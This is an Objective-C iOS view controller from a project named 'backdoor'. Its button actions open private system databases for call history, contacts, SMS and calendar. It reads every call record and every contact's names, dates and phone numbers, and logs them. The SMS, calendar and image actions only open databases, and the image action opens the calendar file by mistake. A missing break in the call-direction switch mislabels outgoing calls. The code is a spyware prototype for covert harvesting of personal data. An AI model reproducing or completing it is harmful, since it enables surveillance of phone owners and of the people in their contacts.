//
//  ViewController.m
//  backdoor
//
//  Created by sway on 16/1/22.
//  Copyright © 2016年 sway. All rights reserved.
//

#import "ViewController.h"
@interface ViewController ()
@end

@implementation ViewController
{
    sqlite3 *db;
}
    

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (IBAction) getCallList:(id)sender {
    NSMutableArray *list = [[NSMutableArray alloc] init];

    int result = sqlite3_open("/private/var/wireless/Library/CallHistory/call_history.db", &db);
    if (result == SQLITE_OK) {

        NSString *sql = @"SELECT ROWID,address,date,duration,flags FROM call ORDER BY ROWID DESC";
        sqlite3_stmt *statement;
        const char *errorMsg;
        NSDateFormatter* formatter = [[NSDateFormatter alloc] init];
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSDate* date_date = [[NSDate alloc]init];

        if (sqlite3_prepare_v2(db, [sql UTF8String], -1, &statement, &errorMsg) == SQLITE_OK) {
            while (sqlite3_step(statement) == SQLITE_ROW) {

                char *addr = (char *)sqlite3_column_text(statement, 1);
                NSString *address = [[NSString alloc] initWithUTF8String:addr];
                int date = sqlite3_column_int(statement, 2);
                date_date = [date_date initWithTimeIntervalSince1970:(NSTimeInterval)date];
                NSString* dateString = [formatter stringFromDate:date_date];

                int duration = sqlite3_column_int(statement, 3);
                int flag = sqlite3_column_int(statement, 4);

                NSMutableDictionary *record = [NSMutableDictionary dictionary];
                [record setValue:address forKey:@"phoneNum"];
                [record setValue:dateString forKey:@"date"];
                [record setValue:[NSNumber numberWithInt:duration] forKey:@"duration"];
                switch (flag) {
                    case 0:
                        [record setValue:@"call in" forKey:@"direction"];
                        break;
                    case 9:
                        [record setValue:@"call out" forKey:@"direction"];
                    default:
                        [record setValue:@"unknown" forKey:@"direction"];
                        break;
                }
                [list addObject:record];
            }
        } else {
            NSLog(@"%s", errorMsg);
        }
    }
    NSLog(@"%d", result);
}

- (IBAction) getAddressBook:(id)sender {
    ABAddressBookRef addressBookRef = ABAddressBookCreate();
    ABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted, CFErrorRef error){
        ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL, NULL);
        [self copyAddressBook:addressBook];
    });

    int result = sqlite3_open("/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb", &db);
    NSLog(@"%d", result);
}

- (IBAction) getSMS:(id)sender {
    int result = sqlite3_open("/private/var/mobile/Library/SMS/sms.db", &db);
    NSLog(@"%d", result);
}

- (IBAction) getCalendar:(id)sender {
    int result = sqlite3_open("/private/var/mobile/Library/Calendar/Calendar.sqlitedb", &db);
    NSLog(@"%d", result);
}

- (IBAction) getImages:(id)sender { 
    int result = sqlite3_open("/private/var/mobile/Library/Calendar/Calendar.sqlitedb", &db);
    NSLog(@"%d", result);
}

- (void)copyAddressBook:(ABAddressBookRef)addressBook
{
    CFIndex numberOfPeople = ABAddressBookGetPersonCount(addressBook);
    CFArrayRef people = ABAddressBookCopyArrayOfAllPeople(addressBook);

    for ( int i = 0; i < numberOfPeople; i++){
        ABRecordRef person = CFArrayGetValueAtIndex(people, i);

        NSString *firstName = (__bridge NSString *)(ABRecordCopyValue(person, kABPersonFirstNameProperty));
        NSString *lastName = (__bridge NSString *)(ABRecordCopyValue(person, kABPersonLastNameProperty));
        //读取middlename
        NSString *middlename = (__bridge NSString*)ABRecordCopyValue(person, kABPersonMiddleNameProperty);
        //读取nickname呢称
        NSString *nickname = (__bridge NSString*)ABRecordCopyValue(person, kABPersonNicknameProperty);
        //第一次添加该条记录的时间
        NSString *firstknow = (__bridge NSString*)ABRecordCopyValue(person, kABPersonCreationDateProperty);
        NSLog(@"第一次添加该条记录的时间%@\n",firstknow);
        //最后一次修改該条记录的时间
        NSString *lastknow = (__bridge NSString*)ABRecordCopyValue(person, kABPersonModificationDateProperty);
        NSLog(@"最后一次修改該条记录的时间%@\n",lastknow);


        //读取电话多值
        ABMultiValueRef phone = ABRecordCopyValue(person, kABPersonPhoneProperty);
        for (int k = 0; k<ABMultiValueGetCount(phone); k++)
        {
            //获取电话Label
            NSString * personPhoneLabel = (__bridge NSString*)ABAddressBookCopyLocalizedLabel(ABMultiValueCopyLabelAtIndex(phone, k));
            //获取该Label下的电话值
            NSString * personPhone = (__bridge NSString*)ABMultiValueCopyValueAtIndex(phone, k);
            NSLog(@"%@:%@", personPhoneLabel, personPhone);
        }
        
    }
}

@end
